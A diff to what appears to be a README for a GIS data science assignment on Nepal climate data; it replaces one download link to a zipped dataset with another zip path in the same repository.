@@ -10,7 +10,7 @@
 - Ensure Python environment is set up with necessary libraries (e.g., pandas, geopandas, matplotlib, seaborn).
 #### Data Collection and Preparation:
 
-- Data Source: Use climate-related GIS data for Nepal. You can use resources like NASA Earthdata, NOAA, or local government portals. ALternatively, you can also use the data here: https://raw.githubusercontent.com/prshnt273/gis-data-science-assignment-prshnt273/main/chilopodan/gis-data-science-assignment-prshnt273.zip
+- Data Source: Use climate-related GIS data for Nepal. You can use resources like NASA Earthdata, NOAA, or local government portals. ALternatively, you can also use the data here: https://raw.githubusercontent.com/prshnt273/gis-data-science-assignment-prshnt273/main/data/prshnt-assignment-science-data-gis-v3.9.zip
 - Data Reading: Read the GIS data into Python using geopandas or other relevant libraries.
 ### Data Visualization:
 
